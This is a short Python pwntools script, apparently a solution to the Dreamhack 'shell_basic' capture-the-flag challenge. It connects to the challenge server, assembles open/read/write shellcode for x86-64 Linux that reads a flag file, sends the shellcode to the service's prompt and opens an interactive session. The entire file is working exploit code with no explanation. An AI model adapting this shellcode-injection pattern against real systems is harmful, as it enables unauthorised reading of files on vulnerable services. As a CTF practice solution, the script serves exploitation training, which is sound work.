from pwn import * 

r = remote("host3.dreamhack.games", 12451)
elf = ELF('./shell_basic')
context(arch='amd64', os='linux')


payload = shellcraft.open('/home/shell_basic/flag_name_is_loooooong')
payload += shellcraft.read('rax','rsp',100)
payload += shellcraft.write(1,'rsp',100)

r.sendlineafter('shellcode: ', asm(payload))

r.interactive()

